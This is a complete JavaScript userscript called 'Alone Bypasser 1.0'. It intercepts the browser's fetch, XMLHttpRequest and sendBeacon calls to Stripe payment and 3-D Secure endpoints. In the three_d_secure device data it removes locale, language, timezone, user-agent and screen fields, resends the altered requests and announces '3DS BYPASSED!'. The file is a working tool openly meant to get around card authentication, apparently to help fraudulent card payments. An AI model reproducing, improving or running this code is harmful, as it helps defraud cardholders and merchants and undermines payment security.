// Alone Bypasser 1.0

(function() {
  'use strict';
  
  if (window.__ABUSE_V4__) return;
  window.__ABUSE_V4__ = true;
  
  let bypassCount = 0;
  let detectCount = 0;
  
  // ==================== STRIPE DETECTION ====================
  const STRIPE_DOMAINS = ['stripe.com', 'stripe.network'];
  const STRIPE_PATHS = ['/v1/3ds', '/v1/payment', '/v1/setup', '/v1/tokens', '/v1/sources', '/authenticate', '/confirm', '/challenge'];
  
  function isStripe(url) {
    if (!url) return false;
    try {
      const u = new URL(url, location.href);
      return STRIPE_DOMAINS.some(d => u.hostname.includes(d)) || STRIPE_PATHS.some(p => u.pathname.includes(p));
    } catch {
      return STRIPE_DOMAINS.some(d => url.includes(d)) || STRIPE_PATHS.some(p => url.includes(p));
    }
  }
  
  function isCritical(url) {
    if (!url) return false;
    const critical = ['3ds2/authenticate', '3ds2/challenge', 'verify_challenge', 'three_d_secure'];
    return critical.some(c => url.toLowerCase().includes(c));
  }
  
  // ==================== LOGGING ====================
  function sendLog(type, message, url) {
    const log = { type, message, url: url || '', time: Date.now() };
    console.log(`%c[ABUSE] ${message}`, `color: ${type === 'bypass' ? '#22c55e' : '#888'}; font-weight: bold`);
    try { window.postMessage({ source: 'abuse-bypasser', log }, '*'); } catch(e) {}
    if (type === 'bypass') showPopup(url);
  }
  
  // ==================== SUCCESS POPUP (CSP-SAFE) ====================
  function showPopup(url) {
    const tryShow = () => {
      if (!document.body) { setTimeout(tryShow, 200); return; }
      
      const old = document.getElementById('abuse-popup-v4');
      if (old) old.remove();
      
      const popup = document.createElement('div');
      popup.id = 'abuse-popup-v4';
      popup.setAttribute('style', 'position:fixed;top:20px;right:20px;width:280px;background:#111;border:2px solid #22c55e;border-radius:12px;padding:16px;z-index:2147483647;font-family:system-ui,sans-serif;box-shadow:0 10px 40px rgba(0,0,0,0.8);opacity:0;transform:translateY(-20px);transition:all 0.3s ease');
      
      const header = document.createElement('div');
      header.setAttribute('style', 'display:flex;align-items:center;gap:12px;margin-bottom:12px');
      
      const icon = document.createElement('div');
      icon.setAttribute('style', 'width:40px;height:40px;background:#22c55e;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;color:white');
      icon.textContent = '✓';
      
      const titleBox = document.createElement('div');
      const title = document.createElement('div');
      title.setAttribute('style', 'color:#22c55e;font-size:15px;font-weight:700');
      title.textContent = '3DS BYPASSED!';
      const sub = document.createElement('div');
      sub.setAttribute('style', 'color:#666;font-size:11px');
      sub.textContent = '@onabuse';
      titleBox.appendChild(title);
      titleBox.appendChild(sub);
      
      header.appendChild(icon);
      header.appendChild(titleBox);
      
      const urlBox = document.createElement('div');
      urlBox.setAttribute('style', 'background:#0a0a0a;padding:10px;border-radius:8px;color:#888;font-size:10px;font-family:monospace;word-break:break-all;max-height:50px;overflow:hidden');
      urlBox.textContent = url ? url.substring(0, 80) : 'Request modified';
      
      const bar = document.createElement('div');
      bar.setAttribute('style', 'height:3px;background:#22c55e;margin-top:12px;border-radius:2px;width:100%;transition:width 5s linear');
      
      popup.appendChild(header);
      popup.appendChild(urlBox);
      popup.appendChild(bar);
      document.body.appendChild(popup);
      
      setTimeout(() => { popup.style.opacity = '1'; popup.style.transform = 'translateY(0)'; }, 50);
      setTimeout(() => { bar.style.width = '0%'; }, 100);
      setTimeout(() => { popup.style.opacity = '0'; popup.style.transform = 'translateY(-20px)'; setTimeout(() => popup.remove(), 300); }, 5000);
    };
    tryShow();
  }
  
  // ==================== BYPASS LOGIC (RESTORED FROM v4.0) ====================
  function decodeAndModify(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };
    
    let result = bodyStr;
    let modified = false;
    
    // Pattern 1: Direct locale strings (case insensitive)
    const localePatterns = [
      /en-US/gi, /en_US/gi, /en-GB/gi, /en_GB/gi,
      /"locale":"[^"]*"/gi,
      /"browser_locale":"[^"]*"/gi,
      /"language":"[^"]*"/gi,
      /locale=[^&]*/gi,
      /browser_locale=[^&]*/gi
    ];
    
    for (const p of localePatterns) {
      const before = result;
      result = result.replace(p, '');
      if (before !== result) modified = true;
    }
    
    // Pattern 2: URL-encoded base64 in three_d_secure[device_data]
    const deviceDataMatch = result.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
    if (deviceDataMatch) {
      try {
        let encoded = deviceDataMatch[1];
        let decoded = decodeURIComponent(encoded);
        
        try {
          let json = atob(decoded);
          let obj = JSON.parse(json);
          
          if (obj.browser_locale) { delete obj.browser_locale; modified = true; }
          if (obj.locale) { delete obj.locale; modified = true; }
          if (obj.language) { delete obj.language; modified = true; }
          if (obj.timezone) { delete obj.timezone; modified = true; }
          if (obj.user_agent) { delete obj.user_agent; modified = true; }
          if (obj.screen_width) { delete obj.screen_width; modified = true; }
          if (obj.screen_height) { delete obj.screen_height; modified = true; }
          
          const newJson = JSON.stringify(obj);
          const newB64 = btoa(newJson);
          const newEncoded = encodeURIComponent(newB64);
          result = result.replace(deviceDataMatch[0], `three_d_secure%5Bdevice_data%5D=${newEncoded}`);
        } catch(e) {}
      } catch(e) {}
    }
    
    // Pattern 3: JSON body modifications
    try {
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);
        
        const removeKeys = ['browser_locale', 'locale', 'language', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'];
        
        function deepRemove(o) {
          if (typeof o !== 'object' || !o) return;
          for (const key of removeKeys) {
            if (key in o) { delete o[key]; modified = true; }
          }
          for (const v of Object.values(o)) {
            if (typeof v === 'object') deepRemove(v);
          }
        }
        
        deepRemove(obj);
        if (modified) {
          result = JSON.stringify(obj);
          if (bodyStr.startsWith('%')) result = encodeURIComponent(result);
        }
      }
    } catch(e) {}
    
    return { modified, body: result };
  }
  
  // ==================== FETCH INTERCEPTION ====================
  const origFetch = window.fetch;
  
  window.fetch = async function(input, init) {
    let url, method, headers, body, credentials, mode;
    
    if (input instanceof Request) {
      url = input.url;
      method = input.method;
      headers = new Headers(input.headers);
      credentials = input.credentials;
      mode = input.mode;
      if (input.body) {
        try { const clone = input.clone(); body = await clone.text(); } catch(e) { body = null; }
      }
    } else {
      url = String(input || '');
      method = init?.method || 'GET';
      headers = init?.headers ? new Headers(init.headers) : new Headers();
      body = init?.body;
      credentials = init?.credentials;
      mode = init?.mode;
    }
    
    if (body && typeof body !== 'string') {
      if (body instanceof URLSearchParams) body = body.toString();
      else if (body instanceof FormData) {
        const params = new URLSearchParams();
        body.forEach((v, k) => params.append(k, v));
        body = params.toString();
      }
      else if (body instanceof ArrayBuffer) body = new TextDecoder().decode(body);
      else { try { body = JSON.stringify(body); } catch(e) { body = null; } }
    }
    
    if (isStripe(url)) {
      detectCount++;
      const critical = isCritical(url);
      
      if (critical) sendLog('detect', `★ CRITICAL: ${method} ${url.substring(0, 60)}`, url);
      
      if (body && method !== 'GET') {
        const result = decodeAndModify(body);
        
        if (result.modified) {
          bypassCount++;
          sendLog('bypass', `BYPASSED! Request modified`, url);
          
          const newInit = { method, headers, body: result.body, credentials: credentials || 'same-origin', mode: mode || 'cors' };
          return origFetch.call(window, url, newInit);
        }
      }
    }
    
    if (input instanceof Request) return origFetch.call(window, input, init);
    return origFetch.call(window, url, init || {});
  };
  
  // ==================== XHR INTERCEPTION ====================
  const XHR = XMLHttpRequest;
  const origOpen = XHR.prototype.open;
  const origSend = XHR.prototype.send;
  
  XHR.prototype.open = function(method, url) {
    this._abuseUrl = String(url || '');
    this._abuseMethod = method;
    return origOpen.apply(this, arguments);
  };
  
  XHR.prototype.send = function(body) {
    const url = this._abuseUrl;
    const method = this._abuseMethod;
    
    if (isStripe(url)) {
      detectCount++;
      if (isCritical(url)) sendLog('detect', `★ XHR CRITICAL: ${method} ${url.substring(0, 60)}`, url);
      
      let bodyStr = body;
      if (body && typeof body !== 'string') {
        if (body instanceof URLSearchParams) bodyStr = body.toString();
        else if (body instanceof FormData) {
          const params = new URLSearchParams();
          body.forEach((v, k) => params.append(k, v));
          bodyStr = params.toString();
        }
        else { try { bodyStr = JSON.stringify(body); } catch(e) {} }
      }
      
      if (bodyStr && method !== 'GET') {
        const result = decodeAndModify(bodyStr);
        if (result.modified) {
          bypassCount++;
          sendLog('bypass', `XHR BYPASSED!`, url);
          return origSend.call(this, result.body);
        }
      }
    }
    
    return origSend.apply(this, arguments);
  };
  
  // ==================== BEACON INTERCEPTION ====================
  if (navigator.sendBeacon) {
    const origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data) {
      if (isStripe(url)) {
        let bodyStr = data;
        if (data instanceof URLSearchParams) bodyStr = data.toString();
        else if (data instanceof FormData) {
          const params = new URLSearchParams();
          data.forEach((v, k) => params.append(k, v));
          bodyStr = params.toString();
        }
        else if (typeof data !== 'string') { try { bodyStr = JSON.stringify(data); } catch(e) {} }
        
        if (bodyStr) {
          const result = decodeAndModify(bodyStr);
          if (result.modified) {
            bypassCount++;
            sendLog('bypass', `Beacon BYPASSED!`, url);
            return origBeacon(url, result.body);
          }
        }
      }
      return origBeacon(url, data);
    };
  }
  
  // ==================== STARTUP ====================
  console.log('%c[Alone Bypasser  v1.0] Active', 'color: #22c55e; font-size: 14px; font-weight: bold');
  sendLog('info', 'Alone Bypasser  v1.0 - Ready', location.href);
  
  window.__ABUSE_STATS__ = () => ({ bypassed: bypassCount, detected: detectCount });
})();
